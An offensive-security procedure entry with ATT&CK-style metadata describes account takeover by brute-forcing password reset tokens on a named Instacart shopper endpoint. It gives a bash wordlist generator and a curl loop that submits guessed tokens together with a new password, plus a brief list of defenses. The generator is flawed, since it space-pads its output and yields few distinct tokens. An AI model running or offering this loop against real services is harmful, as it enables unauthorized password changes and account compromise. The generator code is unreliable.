---
tags:
  - brute-force
  - account-takeover
type: procedure
tools: []
tactics:
  - '[[Credential Access]]'
commands:
  - '[[commands/curl-post-password-reset]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Brute Force]]'
updated_at: '2025-12-14T17:33:06.575Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques:
  - '[[Password Guessing]]'
id: 8193f9c3-e2d0-418b-9a7b-837539c9a928
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Brute Force]]'
---
# Brute Force Reset Tokens via Unlimited Requests

## Summary

This procedure exploits the absence of rate limiting by repeatedly submitting guessed 20-character tokens to the password reset endpoint until a valid one is found, enabling unauthorized password changes and account takeover.

## Description

Without rate limits or timeouts, the Instacart /password POST endpoint allows unlimited brute force attempts. Attackers generate token guesses (e.g., alphanumeric combinations) and loop requests, succeeding when a match occurs, as there's no further authentication required. This leads to full compromise of the associated shopper account.

## Requirements

1. Wordlist of 20-character token guesses (e.g., generated via scripts)
2. Authenticity token and session cookies
3. Scripting capability (bash, Python) for automation
4. Target account's reset token space (inferred from format)

## Defense

Defensive measures and detection strategies:

- Introduce exponential backoff or IP bans after 20 failures
- Token entropy increase (longer or more complex)
- Web Application Firewall (WAF) rules for repetitive POST patterns
- SIEM alerts on high-volume /password access

## Objectives

1. Exhaustively guess valid tokens
2. Reset password without restrictions
3. Achieve persistent account access

## Instructions

### Step 1: Generate Token Wordlist

**Context**: Create a list of possible 20-character tokens based on observed format (alphanumeric).

**Command** ([[commands/generate-token-wordlist]]):
```bash
# Simple generator example (use tools like crunch for full)
for i in {1..1000}; do printf '%020s' $(echo $i | tr '[:digit:]' 'a'); echo; done > token_wordlist.txt
```

> Generates sample guesses. Expected output: File with 1000 20-char strings.

### Step 2: Loop Brute Force Requests

**Context**: Automate POST requests with each guess, checking for success.

**Command** ([[commands/curl-post-password-reset]]):
```bash
for token in $(cat token_wordlist.txt); do
  response=$(curl -s -X POST https://shoppers.instacart.com/password \
    -d "utf8=%E2%9C%93" \
    -d "_method=put" \
    -d "authenticity_token=your_token_here" \
    -d "driver[reset_password_token]=$token" \
    -d "driver[password]=new_password" \
    -d "driver[password_confirmation]=new_password" \
    -d "commit=Change+my+password" \
    -b cookies.txt)
  if [[ ! $response =~ "invalid" ]]; then
    echo "Valid token found: $token"
    break
  fi
done
```

> Runs the loop. Expected output: Detection of valid token and password change confirmation.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]] Credential Access

### Techniques

- [[Brute Force]] Brute Force

### Sub-Techniques

- [[Password Guessing]] Password Guessing

## Commands Used

- [[commands/generate-token-wordlist]]
- [[commands/curl-post-password-reset]]

## Tools Used


## Tags

- [[brute-force]]
- [[account-takeover]]
